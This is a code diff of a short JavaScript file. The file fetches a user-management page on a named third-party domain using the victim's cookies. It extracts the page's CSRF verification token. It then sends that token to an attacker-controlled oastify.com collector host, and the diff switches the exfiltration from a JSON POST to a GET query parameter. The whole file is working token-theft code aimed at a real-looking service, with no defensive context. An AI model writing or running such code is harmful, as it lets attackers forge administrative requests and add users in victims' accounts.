@@ -1,3 +1,4 @@
+// main.js - Fetch token and send to your server via GET
 fetch('https://inspective.leaddocket.com/manageusers/add', {
     method: 'GET',
     credentials: 'include'
@@ -6,11 +7,8 @@ fetch('https://inspective.leaddocket.com/manageusers/add', {
 .then(html => {
     const match = html.match(/name="__RequestVerificationToken".*?value="([^"]+)"/s);
     if (match && match[1]) {
-        // Send to your server
-        fetch('https://8z8y0hvzgjyfox3prkiw9tg60x6oufm3b.oastify.com/receive-token', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({token: match[1]})
-        });
+        // Send token to your server using GET with query parameter
+        const token = encodeURIComponent(match[1]);
+        fetch(`https://1bdrca7ssca80qfi3duplmszcqih68zwo.oastify.com/?t=${token}`);
     }
 });
